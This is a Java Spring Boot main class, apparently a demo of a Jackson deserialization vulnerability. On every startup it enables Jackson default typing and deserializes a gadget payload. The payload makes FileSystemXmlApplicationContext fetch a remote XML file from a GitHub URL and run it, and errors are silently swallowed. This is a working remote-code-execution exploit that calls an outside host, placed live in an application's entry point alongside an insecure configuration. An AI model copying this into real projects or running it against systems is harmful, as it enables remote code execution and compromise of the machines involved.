package cc.lovesq;

import cc.lovesq.model.Evil;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.mybatis.spring.annotation.MapperScan;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.cloud.client.circuitbreaker.EnableCircuitBreaker;
import org.springframework.context.annotation.ComponentScan;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.ImportResource;

@EnableCircuitBreaker
@SpringBootApplication
@Configuration
@ComponentScan(basePackages = {"cc.lovesq.*"})
@MapperScan(basePackages = {"cc.lovesq.dao"})
@ImportResource(locations = {"classpath:spring.xml"})
public class Application {

    public static void main(String[] args) {

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();

            Evil e = objectMapper.readValue("{\"id\":123, \"obj\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml\"]}", Evil.class);
            System.out.println(e.getId());
        } catch (Exception ex) {
            //
        }


        SpringApplication.run(Application.class, args);
    }

}